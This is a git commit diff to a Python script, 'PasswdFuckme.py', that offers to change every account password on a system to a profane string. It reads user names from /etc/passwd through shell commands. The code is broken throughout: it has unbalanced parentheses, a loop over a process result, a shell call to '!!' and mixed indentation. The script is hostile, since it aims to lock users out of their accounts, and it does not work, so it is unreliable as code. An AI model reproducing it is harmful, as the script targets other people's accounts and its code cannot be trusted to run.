c88305494237bad22b280391141ccb756db75580
Aiden-Taylor <57740540+Aiden-Taylor@users.noreply.github.com>
2019-11-14 21:27:56 -0800

    Update PasswdFuckme.py

--- PasswdFuckme.py
+++ PasswdFuckme.py
@@ -1,4 +1,8 @@
 import subprocess as yeet
+main = input("What is your username, bwayne?")
 if input('Change all passwords to "Your%Mom%Is%Fucking%Gay69&420? (y/n)"' == ("y" or "Y"):
 	 x = yeet.run(["cut -d: -f1 /etc/passwd | wc -l"], shell=True)
-	 print(x)
+	 for i in x:
+	 	yeet.run(["cut -d: -f1 /etc/passwd | sed '" + i + "!d'"], shell=False
+	 	user = yeet.run(["!!"], shell=True)
+		print(user)
